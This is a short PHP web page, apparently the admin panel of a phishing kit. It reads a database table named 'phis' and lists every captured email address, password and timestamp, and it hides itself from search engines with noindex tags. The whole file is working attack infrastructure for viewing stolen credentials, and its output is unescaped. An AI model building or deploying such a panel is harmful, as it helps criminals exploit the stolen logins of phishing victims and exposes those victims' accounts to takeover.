<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Shehroz_21 </title>
	
<meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
</head>
<body style="margin:0px">
	<?php
		require_once('db-connection.php');
		$query = "SELECT * FROM `phis`";
		$result = $link->query($query);
		echo "<table style='text-align:left' border='1'><tr><th>Email</th><th>Password</th><th>Time</th></tr>";
		while($row  = $result->fetch_array(MYSQLI_ASSOC)){
			echo "<tr><td>".$row['Email']."</td><td>".$row['Password']."</td><td>".$row['Time']."</td></tr>";
		}
		echo "</table>";
	?>
</body>
</html>
